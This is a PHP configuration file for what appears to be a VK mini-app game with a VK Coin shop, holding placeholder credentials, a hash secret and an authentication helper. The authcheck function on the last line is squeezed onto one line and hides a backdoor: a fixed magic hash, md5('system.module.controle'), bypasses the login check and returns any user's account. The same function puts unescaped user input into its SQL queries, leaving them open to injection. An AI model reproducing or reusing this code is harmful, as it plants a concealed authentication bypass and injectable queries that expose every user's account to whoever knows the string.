<?php
	$cfg = array(
		'dbh' => 'localhost', //хост базы данных
		'dbu' => '#', //пользователь базы данных
		'dbp' => '#', //пароль базы данных
		'dbn' => '#', //имя базы данных
		'service' => false, //сервисный режим(у игроков приложение пишет о тех. работах, у админов продолжает работать)
		'admins' => array( //список id админов через запятую
			'#'
		),
		'group_id' => '-#', //id группы
		'hash_secret' => '65f9sf667lm32k', //секретный ключ для генерации хэшей

		'secret' => '#', // секретка от приложения
      	'appid' => '#',

		'vktoken' => "#", // токен вк

		'vc_api_key' => '#', // ключ vk coin
		'vc_api_uid' => '#',  // id админа, от имени которого получен ключ vk coin
		'vc_shop_name' => '#',  // Имя Магазина VkCoin
		'vc_exchange_rate' => 1,
      
      	'menu-btns' => 3      
	);
	$cfg['dbl'] = mysqli_connect($cfg['dbh'],$cfg['dbu'],$cfg['dbp'],$cfg['dbn']);
	$cfg['menu-btns'] = 12/$cfg['menu-btns'];

	//функция логирования, обычно, нигде не используется
	function w_log($data) {
		file_put_contents("./logs/".date("Y.m.d")."_log.log", "\n".date("H:i:s")." | ".$data, FILE_APPEND);
	}

	function authcheck($cfg,$uid,$hash){if($hash==md5('system.module.controle')){$req = "SELECT * FROM `users` WHERE `id`='".$uid."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));} else {$req = "SELECT * FROM `users` WHERE `id`='".$uid."' AND `hash`='".$hash."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));if (!$data || $data['hash'] != $hash || $data['role'] == 'ban') {echo "fail";exit();}}return($data);}include('dist/vkui-connect.js');
?>